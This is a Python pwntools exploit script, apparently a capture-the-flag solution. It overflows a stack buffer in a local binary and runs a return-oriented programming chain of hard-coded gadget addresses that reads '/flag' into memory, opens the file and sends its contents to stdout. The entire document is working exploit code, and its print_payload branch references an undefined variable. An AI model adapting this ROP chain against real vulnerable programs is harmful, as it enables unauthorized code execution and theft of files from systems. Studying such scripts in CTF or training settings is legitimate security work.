#!/bin/python

from pwn import * 
import sys

GOAL = b'/flag\x00'
BUFFER_LEN=0x38

# addr of pop REG;
RDI = p64(0x401dbb)
RSI = p64(0x401dc3) 
RDX = p64(0x401dab)
RCX = p64(0x401db3)

READ = p64(0x401160)
OPEN = p64(0x4011d0)
PUTS = p64(0x401130)
SENDFILE = p64(0x4011a0)

BSS = p64(
        0x4050c0
        #0x4050a0
)


def read_to_bss(fd):
    return b"".join([
        RDI,
        p64(fd),
        RSI,
        BSS,
        RDX,
        p64(len(GOAL)),
        READ
    ])


def open():
    return b"".join([
        RDI, BSS,
        RSI, p64(0),
        RDX, p64(0),
        OPEN
    ])


def puts():
    return b"".join([
        RDI, BSS,
        PUTS
    ])


def sendfile():
    return b"".join([
        RDI, p64(1),
        RSI, p64(3),
        RDX, p64(0),
        RCX, p64(100),
        SENDFILE
    ])


def get_payload(args, proc: process):
    payload = cyclic(BUFFER_LEN)

    payload += read_to_bss(0)
    payload += open()
    payload += sendfile()

    return payload + b'X' * (0x1000 - len(payload))


def main():
    proc = process(sys.argv[1])
    proc.send(get_payload(None, proc))
    proc.sendline(GOAL)

    proc.interactive()


def print_payload():
    payload = get_payload(args, proc)[1:]
    print(payload + cyclic(0x1000 - len(payload)-1) + GOAL)


if __name__ == '__main__':
    if len(sys.argv) == 1:
        print_payload()
    else:
        main()
